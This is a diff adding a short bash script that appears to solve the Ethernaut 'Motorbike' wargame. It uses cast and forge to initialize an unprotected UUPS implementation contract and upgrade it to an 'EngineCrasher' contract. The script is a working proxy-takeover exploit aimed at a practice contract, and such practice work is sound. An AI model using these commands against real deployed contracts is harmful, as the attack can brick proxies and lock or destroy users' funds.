@@ -1,0 +1,17 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+
+CON=0x3dE4eC86758D2298F151718017bbe8314a784645
+
+# cast storage $CON 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+IMPL=0xc491430784a40fce03a0890d5c412ab599e428e2
+
+# cast send --private-key $KEY $IMPL 'initialize()'
+
+# forge create --private-key $KEY '25.motorbike.sol:EngineCrasher'
+HACK=0xd6d78cf6dcbaf6d3468b0b07a77a8b612d3d75bf
+
+cast send --private-key $KEY $IMPL 'upgradeToAndCall(address,bytes)' $HACK "0x01"
